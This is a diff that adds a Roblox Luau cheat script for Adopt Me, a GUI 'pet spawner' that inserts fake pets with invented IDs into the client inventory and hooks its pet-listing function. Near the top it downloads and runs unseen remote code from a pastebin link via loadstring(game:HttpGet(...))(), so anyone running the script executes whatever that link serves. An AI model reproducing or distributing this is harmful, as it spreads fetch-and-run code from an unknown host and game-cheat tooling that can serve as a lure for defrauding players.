@@ -1,0 +1,354 @@
+-- Skai Pet Spawner | Non-stacking, infinite random age, ordered high-tier
+local TweenService = game:GetService("TweenService")
+local Players = game:GetService("Players")
+local LocalPlayer = Players.LocalPlayer
+local RunService = game:GetService("RunService")
+local HttpService = game:GetService("HttpService")
+local UserInputService = game:GetService("UserInputService")
+
+-- ⬇️ Pastebin loader (assuming it contains essential functions)
+loadstring(game:HttpGet("https://pastebin.com/raw/G8uz2h3s"))()
+
+-- Load Adopt Me modules
+local Loads = require(game.ReplicatedStorage.Fsys).load
+local ClientData = Loads("ClientData")
+local InventoryDB = Loads("InventoryDB")
+local Inventory = ClientData.get("inventory")
+
+-- =========================
+-- Main GUI
+-- =========================
+local screenGui = Instance.new("ScreenGui")
+screenGui.Name = "SkaiPetSpawner"
+screenGui.Parent = LocalPlayer:WaitForChild("PlayerGui")
+
+local mainFrame = Instance.new("Frame")
+mainFrame.Size = UDim2.new(0, 320, 0, 300)
+mainFrame.Position = UDim2.new(0.5, -160, 0.4, -150)
+mainFrame.BackgroundColor3 = Color3.fromRGB(30,30,40)
+mainFrame.BorderSizePixel = 0
+mainFrame.Parent = screenGui
+
+local uiCorner = Instance.new("UICorner")
+uiCorner.CornerRadius = UDim.new(0,10)
+uiCorner.Parent = mainFrame
+
+local uiStroke = Instance.new("UIStroke")
+uiStroke.Color = Color3.fromHSV(0,1,1)
+uiStroke.Thickness = 3
+uiStroke.Parent = mainFrame
+
+-- Title
+local titleLabel = Instance.new("TextLabel")
+titleLabel.Size = UDim2.new(1,0,0,25)
+titleLabel.BackgroundTransparency = 1
+titleLabel.Text = "Stacys Spawner"
+titleLabel.Font = Enum.Font.FredokaOne
+titleLabel.TextSize = 20
+titleLabel.TextColor3 = Color3.fromRGB(240,240,255)
+titleLabel.Parent = mainFrame
+
+-- Subtitle
+local subtitleLabel = Instance.new("TextLabel")
+subtitleLabel.Size = UDim2.new(1,0,0,20)
+subtitleLabel.Position = UDim2.new(0,0,0,25)
+subtitleLabel.BackgroundTransparency = 1
+subtitleLabel.Text = "dc @m1cek3"
+subtitleLabel.Font = Enum.Font.FredokaOne
+subtitleLabel.TextSize = 14
+subtitleLabel.TextColor3 = Color3.fromRGB(255,255,255)
+subtitleLabel.TextTransparency = 0.5
+subtitleLabel.Parent = mainFrame
+
+-- Tabs
+local tabFrame = Instance.new("Frame")
+tabFrame.Size = UDim2.new(1,0,0,30)
+tabFrame.Position = UDim2.new(0,0,0,50)
+tabFrame.BackgroundTransparency = 1
+tabFrame.Parent = mainFrame
+
+local petTab = Instance.new("TextButton")
+petTab.Size = UDim2.new(0.5,0,1,0)
+petTab.Text = "Pets"
+petTab.BackgroundColor3 = Color3.fromRGB(80,80,100)
+petTab.Font = Enum.Font.FredokaOne
+petTab.TextColor3 = Color3.fromRGB(255,255,255)
+petTab.TextSize = 16
+petTab.Parent = tabFrame
+
+local toyTab = Instance.new("TextButton")
+toyTab.Size = UDim2.new(0.5,0,1,0)
+toyTab.Position = UDim2.new(0.5,0,0,0)
+toyTab.Text = "Toys"
+toyTab.BackgroundColor3 = Color3.fromRGB(60,60,80)
+toyTab.Font = Enum.Font.FredokaOne
+toyTab.TextColor3 = Color3.fromRGB(255,255,255)
+toyTab.TextSize = 16
+toyTab.Parent = tabFrame
+
+local petContent = Instance.new("Frame")
+petContent.Size = UDim2.new(1,0,1,-80)
+petContent.Position = UDim2.new(0,0,0,80)
+petContent.BackgroundTransparency = 1
+petContent.Visible = true
+petContent.Parent = mainFrame
+
+local toyContent = Instance.new("Frame")
+toyContent.Size = UDim2.new(1,0,1,-80)
+toyContent.Position = UDim2.new(0,0,0,80)
+toyContent.BackgroundTransparency = 1
+toyContent.Visible = false
+toyContent.Parent = mainFrame
+
+petTab.MouseButton1Click:Connect(function()
+    petContent.Visible = true
+    toyContent.Visible = false
+    petTab.BackgroundColor3 = Color3.fromRGB(80,80,100)
+    toyTab.BackgroundColor3 = Color3.fromRGB(60,60,80)
+end)
+
+toyTab.MouseButton1Click:Connect(function()
+    petContent.Visible = false
+    toyContent.Visible = true
+    petTab.BackgroundColor3 = Color3.fromRGB(60,60,80)
+    toyTab.BackgroundColor3 = Color3.fromRGB(80,80,100)
+end)
+
+-- Pet name input
+local petNameBox = Instance.new("TextBox")
+petNameBox.Size = UDim2.new(0.85,0,0,28)
+petNameBox.Position = UDim2.new(0.075,0,0.05,0)
+petNameBox.BackgroundColor3 = Color3.fromRGB(40,40,50)
+petNameBox.TextColor3 = Color3.fromRGB(255,255,255)
+petNameBox.Font = Enum.Font.FredokaOne
+petNameBox.TextSize = 14
+petNameBox.PlaceholderText = "Enter Pet Name"
+petNameBox.ClearTextOnFocus = false
+petNameBox.Parent = petContent
+Instance.new("UICorner", petNameBox)
+
+-- Potion buttons
+local prefixes = {"F","R","N","M"}
+local activeFlags = {F=false,R=false,N=false,M=false}
+local buttonWidth = 0.18
+local spaceBetweenButtons = 0.07
+local totalWidth = #prefixes*buttonWidth + (#prefixes-1)*spaceBetweenButtons
+local startingX = (1-totalWidth)/2
+local prefixColors = {F = Color3.fromRGB(0,200,255), R = Color3.fromRGB(255,50,150), N = Color3.fromRGB(0,255,100), M = Color3.fromRGB(170,0,255)}
+local selectedPotion = "NO POTION"
+
+for i,prefix in ipairs(prefixes) do
+    local prefixButton = Instance.new("TextButton")
+    prefixButton.Size = UDim2.new(buttonWidth,0,0,25)
+    prefixButton.Position = UDim2.new(startingX + (buttonWidth+spaceBetweenButtons)*(i-1),0,0.2,0)
+    prefixButton.Text = prefix
+    prefixButton.BackgroundColor3 = Color3.fromRGB(60,60,70)
+    prefixButton.Font = Enum.Font.FredokaOne
+    prefixButton.TextColor3 = Color3.fromRGB(255,255,255)
+    prefixButton.TextSize = 16
+    prefixButton.Parent = petContent
+    Instance.new("UICorner", prefixButton)
+
+    local stroke = Instance.new("UIStroke")
+    stroke.Parent = prefixButton
+    stroke.Color = Color3.fromRGB(255,255,255)
+    stroke.Thickness = 2
+    stroke.ApplyStrokeMode = Enum.ApplyStrokeMode.Border
+
+    prefixButton.MouseButton1Click:Connect(function()
+        activeFlags[prefix] = not activeFlags[prefix]
+        if activeFlags[prefix] then
+            stroke.Color = prefixColors[prefix]
+            stroke.Thickness = 3
+        else
+            stroke.Color = Color3.fromRGB(255,255,255)
+            stroke.Thickness = 2
+        end
+        local selected = ""
+        for k,v in pairs(activeFlags) do
+            if v then selected = selected..k end
+        end
+        selectedPotion = selected ~= "" and selected or "NO POTION"
+    end)
+end
+
+-- Feedback
+local Feedback = Instance.new("TextLabel")
+Feedback.Size = UDim2.new(1, 0, 0, 20)
+Feedback.Position = UDim2.new(0, 0, 0.7, 0)
+Feedback.BackgroundTransparency = 1
+Feedback.Font = Enum.Font.FredokaOne
+Feedback.TextSize = 14
+Feedback.TextColor3 = Color3.fromRGB(255,255,255)
+Feedback.Text = ""
+Feedback.Parent = petContent
+
+-- High Tier Pets
+local highTierPets = {
+    "Shadow Dragon","Bat Dragon","Frost Dragon","Giraffe","Owl","Parrot","Crow",
+    "Evil Unicorn","Arctic Reindeer","Hedgehog","Dalmatian","Turtle","Kangaroo",
+    "Lion","Elephant","Rhino","Cow","Blazing Lion","African Wild Dog","Diamond Butterfly",
+    "Shark Puppy","Happy Clam","Jellyfish","Goat","Balloon Unicorn","Haetae","Pelican",
+    "Flamingo","Albino Monkey","Goose","Crocodile","Candyfloss Chick","Caterpillar",
+    "Peppermint Penguin","Lion Cub","Puffer Fish","Flaming Fox","Husky","Slime","Mule",
+    "Sheeeeep","Pudding Pup","Nessie","Hare","Isla Turtle","Hot Doggo","Honey Badger",
+    "Puffin","Mini Pig","Ring-tailed Lemur","Border collie","Irish Water Spaniel",
+    "Fairy Bat Dragon","Cupid Bat Dragon","Strawberry Shortcake Bat Dragon",
+    "Chocolate Chip Bat Dragon"
+}
+
+-- 🐾 Spawn Pets
+local function spawnPet(petName, petType)
+    petType = petType or "NO POTION"
+    local function generate_prop()
+        return {
+            flyable = petType:find("F") ~= nil,
+            rideable = petType:find("R") ~= nil,
+            neon = petType:find("N") ~= nil,
+            mega_neon = petType:find("M") ~= nil,
+            potionType = petType,
+            age = math.random(1, 2000000), -- infinite random age
+        }
+    end
+
+    for _, pets in pairs(InventoryDB.pets or {}) do
+        if pets.name == petName then
+            local fake_uuid = HttpService:GenerateGUID(false)
+            local new_pet = table.clone(pets)
+            new_pet.unique = fake_uuid
+            new_pet.category = "pets"
+            new_pet.properties = generate_prop()
+            new_pet.anti_stack_id = tostring(math.random(100000,999999)) .. "-" .. tick()
+            new_pet.favorite = true
+            Inventory.pets[fake_uuid] = new_pet
+
+            Feedback.Text = "✅ Pet Spawned: " .. petName .. " (" .. petType .. ")"
+            Feedback.TextColor3 = Color3.fromRGB(0, 255, 0)
+            return
+        end
+    end
+
+    Feedback.Text = "❌ Pet Not Found: " .. petName
+    Feedback.TextColor3 = Color3.fromRGB(255, 0, 0)
+end
+
+-- Buttons
+local spawnBtn = Instance.new("TextButton")
+spawnBtn.Size = UDim2.new(0.6,0,0,25)
+spawnBtn.Position = UDim2.new(0.2,0,0.5,0)
+spawnBtn.Text = "Spawn Pet"
+spawnBtn.BackgroundColor3 = Color3.fromRGB(0,100,200)
+spawnBtn.Font = Enum.Font.FredokaOne
+spawnBtn.TextColor3 = Color3.fromRGB(255,255,255)
+spawnBtn.TextSize = 16
+spawnBtn.Parent = petContent
+Instance.new("UICorner", spawnBtn)
+
+local highTierBtn = Instance.new("TextButton")
+highTierBtn.Size = UDim2.new(0.6,0,0,25)
+highTierBtn.Position = UDim2.new(0.2,0,0.6,0)
+highTierBtn.Text = "Spawn High Tier"
+highTierBtn.BackgroundColor3 = Color3.fromRGB(200,0,200)
+highTierBtn.Font = Enum.Font.FredokaOne
+highTierBtn.TextColor3 = Color3.fromRGB(255,255,255)
+highTierBtn.TextSize = 16
+highTierBtn.Parent = petContent
+Instance.new("UICorner", highTierBtn)
+
+spawnBtn.MouseButton1Click:Connect(function()
+    if petNameBox.Text ~= "" then
+        spawnPet(petNameBox.Text, selectedPotion)
+    else
+        Feedback.Text = "⚠ Enter a pet name first!"
+        Feedback.TextColor3 = Color3.fromRGB(255, 200, 0)
+    end
+end)
+
+-- =========================
+-- High Tier Button Ordered + Batch Spawn (with normal combos)
+-- =========================
+highTierBtn.MouseButton1Click:Connect(function()
+    local groupedCombos = { "MFR", "MR", "M", "NFR", "NR", "N", "FR", "R", "" }
+
+    local function shuffle(tbl)
+        for i = #tbl, 2, -1 do
+            local j = math.random(i)
+            tbl[i], tbl[j] = tbl[j], tbl[i]
+        end
+        return tbl
+    end
+
+    local function batchSpawn(petsList, combo)
+        local batchSize = 20
+        for i = 1, #petsList, batchSize do
+            for j = i, math.min(i+batchSize-1, #petsList) do
+                spawnPet(petsList[j], combo)
+            end
+            RunService.Heartbeat:Wait()
+        end
+    end
+
+    for _, combo in ipairs(groupedCombos) do
+        batchSpawn(shuffle(highTierPets), combo)
+    end
+end)
+
+-- =========================
+-- Inventory Lag Fix (batch load)
+-- =========================
+local oldGetPets = Inventory.get_pets
+Inventory.get_pets = function(self)
+    local allPets = oldGetPets(self)
+    local result = {}
+    task.delay(0.5, function()
+        local batchSize = 50
+        for i = 1, #allPets, batchSize do
+            local batch = {}
+            for j = i, math.min(i+batchSize-1, #allPets) do
+                table.insert(batch, allPets[j])
+            end
+            for _,pet in ipairs(batch) do
+                table.insert(result, pet)
+            end
+            RunService.Heartbeat:Wait()
+        end
+    end)
+    return result
+end
+
+-- =========================
+-- Draggable GUI
+-- =========================
+local dragging = false
+local dragStart, startPos
+local function updateDrag(input)
+    if dragging then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(
+            startPos.X.Scale,
+            startPos.X.Offset + delta.X,
+            startPos.Y.Scale,
+            startPos.Y.Offset + delta.Y
+        )
+    end
+end
+
+mainFrame.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPos = mainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then
+                dragging = false
+            end
+        end)
+    end
+end)
+
+mainFrame.InputChanged:Connect(updateDrag)
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and (input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch) then
+        updateDrag(input)
+    end
+end)
